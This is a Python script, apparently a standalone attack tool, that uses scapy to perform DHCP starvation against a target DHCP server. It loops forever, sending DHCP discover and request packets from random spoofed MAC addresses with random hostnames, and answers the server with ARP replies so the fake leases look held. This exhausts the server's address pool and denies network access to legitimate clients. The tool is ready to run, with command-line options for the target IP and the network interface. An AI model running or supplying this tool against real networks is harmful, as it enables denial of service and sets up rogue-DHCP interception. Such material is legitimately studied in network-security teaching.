from random_name import random_hostname
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP

def dhcp_discover(spoofed_mac, i_face, Xid, rname):
    """
    sending dhcp discover from the spoofed mac address (broadcast)

    :param spoofed_mac: fake mac address
    :param i_face: the systems network interface for the attack
    """
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    dsc = Ether(src=spoofed_mac, dst=mac_dest, type=0x0800)
    dsc /= IP(src='0.0.0.0', dst=ip_dest)
    dsc /= UDP(sport=68, dport=67)
    dsc /= BOOTP(chaddr=spoofed_mac, xid=Xid, flags=0xFFFFFF)
    dsc /= DHCP(options=[("message-type", "discover"), ("hostname", rname), "end"])
    counter = 0
    while True:
        try:
            sendp(dsc, iface=i_face)
            packets = sniff(count=1, filter="udp and (port 67 or port 68)", iface=i_face, timeout=2)
            for offer in packets:
                # print("[+] discover sent")
                if DHCP in offer and offer[0][DHCP].options[0][1] == 1:
                    if counter > 3:
                    # if no offer is received,3 tries max.
                        print("[!] finishing attack...")
                        exit()
                    print("[!] No offers found, resending dhcp discover")
                    counter += 1
                    continue
                if DHCP in offer and offer[0][DHCP].options[0][1] == 2:
                    time.sleep(3)
                    return offer
        except PermissionError as e:
            print(f"[!] ERROR: The program must run with root privileges: {e}")
            exit()
        except TimeoutError as e:
            print(f"[!] Timeout exceeded: {e}")  
        except Exception as e:
            print(f"[!] Error sending DHCP Discover: {e}")
        

def dhcp_request(req_ip, spoofed_mac, server_ip, i_face, Xid, rname):
    """
    sending dhcp request for a specific ip from the spoofed mac address (broadcast)

    :param req_ip: ip requested by the attacker for the fake mac address
    :param spoofed_mac: fake mac address
    :param server_ip: dhcp servers ip
    :param i_face: the systems network interface for the attack
    """
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    req = Ether(src=spoofed_mac, dst=mac_dest)
    req /= IP(src="0.0.0.0", dst=ip_dest)
    req /= UDP(sport=68, dport=67)
    req /= BOOTP(chaddr=spoofed_mac, xid=Xid)
    req /= DHCP(options=[("message-type", "request"),
                ("server_id", server_ip),
                ("requested_addr", req_ip),
                ("hostname", rname),
                "end"])
    try:
        sendp(req, iface=i_face)
    except Exception as e:
        print(f"[!] Error sending DHCP Request: {e}")


def arp_reply(src_ip, source_mac, server_ip, server_mac, i_face):
    reply = ARP(op=2, hwsrc=mac2str(source_mac), psrc=src_ip, hwdst=server_mac, pdst=server_ip)
    send(reply, iface=i_face)


def starve(target_ip, i_face):
    """
    performing the actual dhcp starvation by generating a dhcp handshake with a fake mac address
    
    :param target_ip: the ip of the targeted dhcp server, if none given than 0 (used as a flag)
    :param i_face: the systems network interface for the attack
    :param persistent: a flag indicating if the attack is persistent or temporary
    """
    # conf.checkIPaddr = False
    while True:
        mac = str(RandMAC())
        xid = random.randint(1, 1000000000)
        rn = random_hostname()
        rname = bytes(rn, encoding='ascii')   
        offer = dhcp_discover(mac, i_face, xid, rname=rname)
        # lease_time = int(3600 * 6)
        offered_ip = str(offer[0][BOOTP].yiaddr)
        server_mac = offer[Ether].src
        print(f'[+] Trying to fetch IP address: {str(offered_ip)}')
        # Send DHCP request to the server with the given ip form the DHCP offer.
        dhcp_request(req_ip=offered_ip, spoofed_mac=mac, server_ip=str(target_ip), i_face=i_face, Xid=xid, rname=rname)
        if offered_ip != '0.0.0.0': print(f"[+] Leased IP address: {offered_ip}\n", '#' * 40, '\n\n')
        arp_reply(src_ip=offered_ip, source_mac=mac, server_ip=str(target_ip), server_mac=server_mac, i_face=i_face)


if __name__ == "__main__":
    
    import argparse
    os.system("clear")
    
    parser = argparse.ArgumentParser(description="DHCP Starvation")
    parser.add_argument('-i', '--iface', metavar="IFACE", default="eth0", type=str, 
                        help='Interface you wish to use; default=eth0')
    parser.add_argument('-t', '--target', metavar="TARGET", default=0, type=str, required=True,
                        help='IP of target server')

    args = parser.parse_args()
    starve(target_ip=args.target, i_face=args.iface)